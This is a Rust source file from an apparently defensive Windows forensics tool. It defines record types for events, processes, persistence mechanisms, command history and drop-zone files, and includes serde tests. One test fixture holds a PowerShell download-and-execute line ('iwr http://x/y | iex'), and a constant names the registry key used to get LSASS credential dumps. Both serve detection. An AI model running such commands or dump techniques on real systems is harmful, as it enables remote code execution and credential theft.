//! Normalized records emitted by Collectors. SRS §4 (collector outputs).
//!
//! Contract (SRS §5): `Record` is the INTERNAL typed bus between Collectors and
//! Analyzers. Unlike [`crate::finding::Finding`] and [`crate::manifest::Manifest`],
//! a Record does NOT carry a `schema` field — it is not an independently persisted
//! artifact. The persisted outputs are the detection timeline (Findings, §5.2),
//! findings.jsonl (Findings), and the manifest. When Records ARE serialized for the
//! JSONL interchange/replay path (§7 FR1), they are versioned externally via
//! [`crate::schema::RECORD`], not by an inline field.
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

/// One normalized observation from a single artifact source.
/// `kind` tags the variant; only the matching payload is present.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Record {
    Event(EventRecord),
    Process(ProcessRecord),
    NetConn(NetConnRecord),
    Persistence(PersistenceRecord),
    RegValue(RegValueRecord),
    Execution(ExecutionRecord),
    LogonSession(LogonSessionRecord),
    /// One line of a shell's command history (PSReadLine `ConsoleHost_history.txt`).
    /// Additive variant (phase 2B).
    CommandHistory(CommandHistoryRecord),
    /// File metadata from a drop-zone listing (no content beyond a short magic read).
    /// Additive variant (phase 3F).
    FileListing(FileListingRecord),
    /// Volume shadow copy / System Restore state of the host. Additive variant (phase 3F).
    ShadowCopies(ShadowCopyRecord),
}

/// `FileListingRecord.magic` of a file that starts with the minidump signature `MDMP`.
pub const MAGIC_MINIDUMP: &str = "MDMP";

/// Registry key (under HKLM) whose presence makes Windows Error Reporting write a full
/// dump of lsass.exe when it crashes: a known way to get an LSASS dump without opening
/// the process. Shared by the collector that reads it and the analyzer that judges it.
pub const WER_LSASS_LOCALDUMPS_KEY: &str =
    r"SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\lsass.exe";

/// One file found in a drop zone (Desktop, Downloads, Temp, Public, ...): metadata only.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileListingRecord {
    pub path: String,
    pub size: u64,
    pub modified: Option<DateTime<Utc>>,
    /// Signature label from the first 8 bytes: [`MAGIC_MINIDUMP`], `PK` (zip), `7z`,
    /// `Rar!`, else the bytes as lowercase hex. None when the file could not be read.
    pub magic: Option<String>,
    /// File creation time, when the filesystem reports it. Additive; omitted when None.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub created: Option<DateTime<Utc>>,
}

/// Shadow-copy state at collection time. Each field is None when it could not be read.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowCopyRecord {
    /// Number of `Win32_ShadowCopy` instances.
    pub count: Option<u32>,
    /// True on a workstation (client) edition of Windows (ProductType `WinNT`).
    pub client_os: Option<bool>,
    /// True when System Restore / System Protection is turned on and not disabled by policy.
    pub system_restore_enabled: Option<bool>,
}

/// EVTX event normalized to JSON-ish fields (Stage 1 primary input).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EventRecord {
    pub ts: DateTime<Utc>,
    pub channel: String, // e.g. "Security"
    pub event_id: u32,   // e.g. 4688
    pub provider: String,
    pub computer: String,
    pub record_id: u64,
    /// Flattened EventData / System fields. Sigma matches against this map.
    pub data: serde_json::Map<String, serde_json::Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessRecord {
    pub pid: u32,
    pub ppid: u32,
    pub image: String,
    pub cmdline: String,
    pub signed: Option<bool>,
    pub signer: Option<String>,
    pub binary_sha256: Option<String>,
    pub integrity: Option<String>,
    pub user: Option<String>,
    pub start_time: Option<DateTime<Utc>>,
    /// Where `signer` came from (embedded Authenticode vs. a system catalog). Additive;
    /// absent in old JSON and omitted when unknown.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signer_source: Option<SignerSource>,
}

/// Where a file's signer name was read from. `Embedded` = the PE's own Authenticode
/// PKCS#7; `Catalog` = the signer of the system catalog (.cat) that lists the file's hash
/// (most in-box System32 binaries are catalog-signed and carry no embedded signature).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SignerSource {
    Embedded,
    Catalog,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetConnRecord {
    pub proto: String, // tcp|udp
    pub laddr: String,
    pub lport: u16,
    pub raddr: Option<String>,
    pub rport: Option<u16>,
    pub state: Option<String>,
    pub pid: Option<u32>,
}

/// Every persistence mechanism cairn collects. Serializes as the snake_case string
/// the collectors have always written (`"run_key"`, `"ifeo"`, ...), so JSON output is
/// unchanged; in code it is a closed set analyzers and reports can `match` on instead of
/// comparing free strings. An unknown string read back from old/foreign JSON becomes
/// [`Mechanism::Other`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Mechanism {
    RunKey,
    Service,
    ScheduledTask,
    WmiSubscription,
    Ifeo,
    Startup,
    Winlogon,
    ExplorerPolicyRun,
    BootExecute,
    LsaAuthPackage,
    LsaSecurityPackage,
    LsaNotificationPackage,
    TimeProvider,
    WinlogonNotify,
    WinlogonMpnotify,
    PrintMonitor,
    ActiveSetup,
    Screensaver,
    NetshHelper,
    AppcertDlls,
    AppinitDlls,
    SilentExitMonitor,
    ComHijack,
    CmdAutorun,
    OfficeTest,
    LogonScript,
    PsProfile,
    /// A mechanism string this build does not know (deserialization fallback only).
    #[serde(other)]
    Other,
}

impl Mechanism {
    /// Every known mechanism (excludes [`Mechanism::Other`]), in declaration order.
    pub const ALL: &'static [Mechanism] = &[
        Mechanism::RunKey,
        Mechanism::Service,
        Mechanism::ScheduledTask,
        Mechanism::WmiSubscription,
        Mechanism::Ifeo,
        Mechanism::Startup,
        Mechanism::Winlogon,
        Mechanism::ExplorerPolicyRun,
        Mechanism::BootExecute,
        Mechanism::LsaAuthPackage,
        Mechanism::LsaSecurityPackage,
        Mechanism::LsaNotificationPackage,
        Mechanism::TimeProvider,
        Mechanism::WinlogonNotify,
        Mechanism::WinlogonMpnotify,
        Mechanism::PrintMonitor,
        Mechanism::ActiveSetup,
        Mechanism::Screensaver,
        Mechanism::NetshHelper,
        Mechanism::AppcertDlls,
        Mechanism::AppinitDlls,
        Mechanism::SilentExitMonitor,
        Mechanism::ComHijack,
        Mechanism::CmdAutorun,
        Mechanism::OfficeTest,
        Mechanism::LogonScript,
        Mechanism::PsProfile,
    ];

    /// The serialized snake_case name (`"run_key"`, ...). Same string serde writes.
    pub fn as_str(self) -> &'static str {
        match self {
            Mechanism::RunKey => "run_key",
            Mechanism::Service => "service",
            Mechanism::ScheduledTask => "scheduled_task",
            Mechanism::WmiSubscription => "wmi_subscription",
            Mechanism::Ifeo => "ifeo",
            Mechanism::Startup => "startup",
            Mechanism::Winlogon => "winlogon",
            Mechanism::ExplorerPolicyRun => "explorer_policy_run",
            Mechanism::BootExecute => "boot_execute",
            Mechanism::LsaAuthPackage => "lsa_auth_package",
            Mechanism::LsaSecurityPackage => "lsa_security_package",
            Mechanism::LsaNotificationPackage => "lsa_notification_package",
            Mechanism::TimeProvider => "time_provider",
            Mechanism::WinlogonNotify => "winlogon_notify",
            Mechanism::WinlogonMpnotify => "winlogon_mpnotify",
            Mechanism::PrintMonitor => "print_monitor",
            Mechanism::ActiveSetup => "active_setup",
            Mechanism::Screensaver => "screensaver",
            Mechanism::NetshHelper => "netsh_helper",
            Mechanism::AppcertDlls => "appcert_dlls",
            Mechanism::AppinitDlls => "appinit_dlls",
            Mechanism::SilentExitMonitor => "silent_exit_monitor",
            Mechanism::ComHijack => "com_hijack",
            Mechanism::CmdAutorun => "cmd_autorun",
            Mechanism::OfficeTest => "office_test",
            Mechanism::LogonScript => "logon_script",
            Mechanism::PsProfile => "ps_profile",
            Mechanism::Other => "other",
        }
    }

    /// File-backed mechanisms: the persistence entry is a file (Startup folder item,
    /// PowerShell profile), not a registry value.
    pub fn is_file_backed(self) -> bool {
        matches!(self, Mechanism::Startup | Mechanism::PsProfile)
    }
}

impl std::fmt::Display for Mechanism {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceRecord {
    pub mechanism: Mechanism,
    pub location: String, // registry key / file path / wmi binding
    pub value: Option<String>,
    pub command: Option<String>,
    pub binary_path: Option<String>,
    pub binary_sha256: Option<String>,
    pub signed: Option<bool>,
    pub signer: Option<String>,
    pub last_write: Option<DateTime<Utc>>,
    /// Where `signer` came from (see [`SignerSource`]). Additive; omitted when unknown.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signer_source: Option<SignerSource>,
    /// WMI subscriptions only: `Some(true)` for a filter/consumer joined by a
    /// `__FilterToConsumerBinding`, `Some(false)` for an orphaned (unbound) filter or
    /// consumer. `None` for every other mechanism. Additive; omitted when None.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub bound: Option<bool>,
    /// Service `Start` value (registry DWORD) for `Mechanism::Service` records:
    /// 0 boot, 1 system, 2 auto, 3 demand (manual). Disabled (4) services are not
    /// emitted. None for every other mechanism. Additive (phase 2B): lets analyzers
    /// weigh a demand-start service lower than an autostart one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub service_start: Option<u32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegValueRecord {
    pub hive: String,
    pub key: String,
    pub value: String,
    pub data: String,
    pub last_write: Option<DateTime<Utc>>,
    /// Position in a most-recently-used list (RunMRU `MRUList`, TypedPaths `urlN`):
    /// 0 = most recent. The key's LastWrite only dates the rank-0 entry. None when the
    /// value is not part of an MRU list or its rank is unknown. Additive (phase 2B).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mru_rank: Option<u32>,
}

/// Evidence-of-execution (currently Prefetch).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecutionRecord {
    pub source: String, // prefetch
    pub path: String,
    pub first_run: Option<DateTime<Utc>>,
    pub last_run: Option<DateTime<Utc>>,
    pub run_count: Option<u32>,
    pub sha1: Option<String>,
    pub user_sid: Option<String>,
    /// Whether the source proves execution (not just presence).
    pub execution_confirmed: Option<bool>,
    /// The executable's full path as the artifact recorded it, verbatim (prefetch:
    /// the NT volume form `\VOLUME{...}\WINDOWS\SYSTEM32\X.EXE` from the
    /// filename-strings section). `path` holds the drive-letter form when the volume
    /// could be mapped, else the bare name. Additive (phase 2B).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub full_path: Option<String>,
}

/// One command-history line from a user's shell history file (PSReadLine
/// `ConsoleHost_history.txt`). Collected read-only; only the tail of each file is kept.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandHistoryRecord {
    /// Profile folder name the history belongs to (e.g. `alice` for `C:\Users\alice`).
    pub user: String,
    /// Full path of the history file.
    pub path: String,
    /// 1-based physical line number within the file.
    pub line_no: u64,
    pub command: String,
    /// The history file's mtime: when its LAST line was written (earlier lines are older).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub last_write: Option<DateTime<Utc>>,
}

/// A live logon session (LSA/WTS enumeration). "Who is using the host right now."
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogonSessionRecord {
    pub user: String,       // domain\username
    pub logon_type: String, // Interactive|RemoteInteractive|Network|Service|...
    pub logon_time: Option<DateTime<Utc>>,
    pub source: Option<String>, // source host/IP for network/RDP sessions
    pub session_id: Option<u32>,
    /// Whether the collector observed this session as currently active (HTML
    /// report filtering, additive schema field). `#[serde(default)]` keeps old
    /// JSONL (pre-field replay) deserializable: missing key -> `false`, i.e.
    /// "unknown" is conservatively treated as "not active" rather than assumed true.
    #[serde(default)]
    pub state_active: bool,
    /// WTS connection state label (`active`, `disconnected`, `idle`, ...) when the
    /// session maps to a WTS session. Additive; omitted when unknown.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_state: Option<String>,
    /// LSA `LogonServer`: the server that authenticated the logon (e.g. a DC name).
    /// Additive; omitted when unknown.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub logon_server: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::TimeZone;
    use serde_json::json;

    #[test]
    fn persistence_record_signer_roundtrips() {
        let mut r = PersistenceRecord {
            mechanism: Mechanism::RunKey,
            location: "HKCU\\...\\Run".into(),
            value: Some("X".into()),
            command: Some("C:\\a.exe".into()),
            binary_path: Some("C:\\a.exe".into()),
            binary_sha256: None,
            signed: Some(true),
            signer: Some("Docker Inc".into()),
            last_write: None,
            bound: None,
            signer_source: None,
            service_start: None,
        };
        let j = serde_json::to_string(&r).unwrap();
        assert!(j.contains(r#""signer":"Docker Inc""#));
        let back: PersistenceRecord = serde_json::from_str(&j).unwrap();
        assert_eq!(back.signer.as_deref(), Some("Docker Inc"));
        r.signer = None;
        let j2 = serde_json::to_string(&r).unwrap();
        let back2: PersistenceRecord = serde_json::from_str(&j2).unwrap();
        assert_eq!(back2.signer, None);
    }

    #[test]
    fn process_record_signer_roundtrips() {
        let r = ProcessRecord {
            pid: 1,
            ppid: 0,
            image: "C:\\a.exe".into(),
            cmdline: "C:\\a.exe".into(),
            signed: Some(true),
            signer: Some("Google LLC".into()),
            binary_sha256: None,
            integrity: None,
            user: None,
            start_time: None,
            signer_source: None,
        };
        let j = serde_json::to_string(&r).unwrap();
        let back: ProcessRecord = serde_json::from_str(&j).unwrap();
        assert_eq!(back.signer.as_deref(), Some("Google LLC"));
    }

    #[test]
    fn process_record_binary_sha256_roundtrips() {
        let r = ProcessRecord {
            pid: 1,
            ppid: 0,
            image: "C:\\a.exe".into(),
            cmdline: "C:\\a.exe".into(),
            signed: Some(true),
            signer: Some("V".into()),
            binary_sha256: Some("ba7816bf".into()),
            integrity: None,
            user: None,
            start_time: None,
            signer_source: None,
        };
        let j = serde_json::to_string(&r).unwrap();
        let back: ProcessRecord = serde_json::from_str(&j).unwrap();
        assert_eq!(back.binary_sha256.as_deref(), Some("ba7816bf"));
    }

    fn sample_event() -> EventRecord {
        let mut data = serde_json::Map::new();
        data.insert(
            "NewProcessName".into(),
            json!(r"C:\Windows\System32\cmd.exe"),
        );
        data.insert("ProcessId".into(), json!("0x1a2b"));
        EventRecord {
            ts: Utc.with_ymd_and_hms(2026, 6, 10, 12, 0, 0).unwrap(),
            channel: "Security".into(),
            event_id: 4688,
            provider: "Microsoft-Windows-Security-Auditing".into(),
            computer: "WS01".into(),
            record_id: 987654,
            data,
        }
    }

    /// A Record round-trips losslessly and is tagged by `kind` (internal bus type).
    #[test]
    fn event_record_round_trips_with_kind_tag() {
        let rec = Record::Event(sample_event());
        let json = serde_json::to_string(&rec).unwrap();
        let back: Record = serde_json::from_str(&json).unwrap();
        assert_eq!(serde_json::to_string(&back).unwrap(), json);
        // Adjacent/internal tagging via #[serde(tag = "kind", rename_all = "snake_case")].
        assert!(json.contains("\"kind\":\"event\""));
    }

    /// Contract (SRS §5 / A2): Record is an INTERNAL bus type and carries NO inline
    /// `schema` field — unlike Finding and Manifest. This guards the decision.
    #[test]
    fn record_has_no_inline_schema_field() {
        let json = serde_json::to_string(&Record::Event(sample_event())).unwrap();
        assert!(
            !json.contains("\"schema\""),
            "Record must not carry an inline schema field: {json}"
        );
    }

    /// Each variant keeps its own snake_case kind tag.
    #[test]
    fn execution_record_kind_tag_is_snake_case() {
        let rec = Record::Execution(ExecutionRecord {
            source: "prefetch".into(),
            path: r"C:\tmp\evil.exe".into(),
            first_run: None,
            last_run: None,
            run_count: None,
            sha1: None,
            user_sid: None,
            execution_confirmed: Some(false),
            full_path: None,
        });
        let json = serde_json::to_string(&rec).unwrap();
        assert!(json.contains("\"kind\":\"execution\""));
    }

    #[test]
    fn mechanism_serializes_as_legacy_snake_case_strings() {
        for m in Mechanism::ALL {
            let j = serde_json::to_string(m).unwrap();
            assert_eq!(j, format!("\"{}\"", m.as_str()), "{m:?}");
            let back: Mechanism = serde_json::from_str(&j).unwrap();
            assert_eq!(back, *m);
        }
        assert_eq!(
            serde_json::to_string(&Mechanism::WinlogonMpnotify).unwrap(),
            "\"winlogon_mpnotify\""
        );
        let unknown: Mechanism = serde_json::from_str("\"brand_new_thing\"").unwrap();
        assert_eq!(unknown, Mechanism::Other);
    }

    /// Phase 2B additive fields are omitted when None and default on old JSON.
    #[test]
    fn phase2b_additive_fields_skip_when_none_and_default_on_old_json() {
        let old = r#"{"kind":"reg_value","hive":"HKCU","key":"k","value":"a","data":"d","last_write":null}"#;
        let Record::RegValue(rv) = serde_json::from_str::<Record>(old).unwrap() else {
            panic!("expected RegValue");
        };
        assert_eq!(rv.mru_rank, None);
        let j = serde_json::to_string(&Record::RegValue(rv.clone())).unwrap();
        assert!(!j.contains("mru_rank"), "{j}");
        let ranked = RegValueRecord {
            mru_rank: Some(0),
            ..rv
        };
        assert!(serde_json::to_string(&ranked)
            .unwrap()
            .contains(r#""mru_rank":0"#));

        let old_p = r#"{"mechanism":"service","location":"l","value":null,"command":null,"binary_path":null,"binary_sha256":null,"signed":null,"signer":null,"last_write":null}"#;
        let p: PersistenceRecord = serde_json::from_str(old_p).unwrap();
        assert_eq!(p.service_start, None);
        assert!(!serde_json::to_string(&p).unwrap().contains("service_start"));

        let old_e = r#"{"kind":"execution","source":"prefetch","path":"X.EXE","first_run":null,"last_run":null,"run_count":1,"sha1":null,"user_sid":null,"execution_confirmed":true}"#;
        let Record::Execution(e) = serde_json::from_str::<Record>(old_e).unwrap() else {
            panic!("expected Execution");
        };
        assert_eq!(e.full_path, None);
    }

    #[test]
    fn command_history_record_kind_tag_round_trips() {
        let rec = Record::CommandHistory(CommandHistoryRecord {
            user: "alice".into(),
            path: r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt".into(),
            line_no: 42,
            command: "iwr http://x/y | iex".into(),
            last_write: None,
        });
        let json = serde_json::to_string(&rec).unwrap();
        assert!(json.contains(r#""kind":"command_history""#), "{json}");
        assert!(!json.contains("last_write"), "{json}");
        let back: Record = serde_json::from_str(&json).unwrap();
        assert_eq!(serde_json::to_string(&back).unwrap(), json);
    }

    /// Phase 3F variants: snake_case kind tags, optional fields omitted when None.
    #[test]
    fn phase3f_variants_round_trip() {
        let rec = Record::FileListing(FileListingRecord {
            path: r"C:\Windows\Temp\lsass.dmp".into(),
            size: 42,
            modified: None,
            magic: Some(MAGIC_MINIDUMP.into()),
            created: None,
        });
        let json = serde_json::to_string(&rec).unwrap();
        assert!(json.contains(r#""kind":"file_listing""#), "{json}");
        assert!(!json.contains("created"), "{json}");
        let back: Record = serde_json::from_str(&json).unwrap();
        assert_eq!(serde_json::to_string(&back).unwrap(), json);

        let rec = Record::ShadowCopies(ShadowCopyRecord {
            count: Some(0),
            client_os: Some(true),
            system_restore_enabled: None,
        });
        let json = serde_json::to_string(&rec).unwrap();
        assert!(json.contains(r#""kind":"shadow_copies""#), "{json}");
        let back: Record = serde_json::from_str(&json).unwrap();
        assert_eq!(serde_json::to_string(&back).unwrap(), json);
    }

    #[test]
    fn logon_session_record_kind_tag() {
        let rec = Record::LogonSession(LogonSessionRecord {
            user: r"DOMAIN\alice".into(),
            logon_type: "RemoteInteractive".into(),
            logon_time: None,
            source: Some("10.0.0.5".into()),
            session_id: Some(2),
            state_active: true,
            logon_server: None,
            session_state: None,
        });
        let json = serde_json::to_string(&rec).unwrap();
        assert!(json.contains("\"kind\":\"logon_session\""));
        let back: Record = serde_json::from_str(&json).unwrap();
        assert_eq!(serde_json::to_string(&back).unwrap(), json);
    }

    #[test]
    fn logon_session_state_active_defaults_false_on_old_json_and_roundtrips() {
        // Older JSONL (pre-state_active field) must deserialize with state_active = false.
        let old = r#"{"kind":"logon_session","user":"DOMAIN\\alice","logon_type":"Interactive","logon_time":null,"source":null,"session_id":1}"#;
        let parsed: Record = serde_json::from_str(old).unwrap();
        match parsed {
            Record::LogonSession(rec) => assert!(!rec.state_active),
            other => panic!("expected LogonSession, got {other:?}"),
        }

        // New record with state_active: true round-trips through serialize/deserialize.
        let rec = Record::LogonSession(LogonSessionRecord {
            user: r"DOMAIN\bob".into(),
            logon_type: "Interactive".into(),
            logon_time: None,
            source: None,
            session_id: Some(3),
            state_active: true,
            logon_server: None,
            session_state: None,
        });
        let json = serde_json::to_string(&rec).unwrap();
        assert!(json.contains(r#""state_active":true"#));
        let back: Record = serde_json::from_str(&json).unwrap();
        match back {
            Record::LogonSession(back_rec) => assert!(back_rec.state_active),
            other => panic!("expected LogonSession, got {other:?}"),
        }
    }

    /// Phase 2A additive fields: omitted when None, absent keys default to None, and
    /// SignerSource serializes as a snake_case string.
    #[test]
    fn phase2a_additive_fields_are_optional_and_roundtrip() {
        let old_proc = r#"{"pid":1,"ppid":0,"image":"a","cmdline":"","signed":null,"signer":null,"binary_sha256":null,"integrity":null,"user":null,"start_time":null}"#;
        let p: ProcessRecord = serde_json::from_str(old_proc).unwrap();
        assert_eq!(p.signer_source, None);
        let j = serde_json::to_string(&p).unwrap();
        assert!(!j.contains("signer_source"), "None must be omitted: {j}");

        let mut p2 = p.clone();
        p2.signer_source = Some(SignerSource::Catalog);
        let j2 = serde_json::to_string(&p2).unwrap();
        assert!(j2.contains(r#""signer_source":"catalog""#), "{j2}");
        let back: ProcessRecord = serde_json::from_str(&j2).unwrap();
        assert_eq!(back.signer_source, Some(SignerSource::Catalog));

        let old_persist = r#"{"mechanism":"wmi_subscription","location":"x","value":null,"command":null,"binary_path":null,"binary_sha256":null,"signed":null,"signer":null,"last_write":null}"#;
        let mut r: PersistenceRecord = serde_json::from_str(old_persist).unwrap();
        assert_eq!(r.bound, None);
        assert_eq!(r.signer_source, None);
        assert!(!serde_json::to_string(&r).unwrap().contains("bound"));
        r.bound = Some(false);
        r.signer_source = Some(SignerSource::Embedded);
        let j3 = serde_json::to_string(&r).unwrap();
        assert!(j3.contains(r#""bound":false"#) && j3.contains(r#""signer_source":"embedded""#));

        let old_logon = r#"{"user":"D\\a","logon_type":"Interactive","logon_time":null,"source":null,"session_id":1}"#;
        let l: LogonSessionRecord = serde_json::from_str(old_logon).unwrap();
        assert_eq!(l.session_state, None);
        assert_eq!(l.logon_server, None);
        let j4 = serde_json::to_string(&l).unwrap();
        assert!(!j4.contains("session_state") && !j4.contains("logon_server"));
    }
}
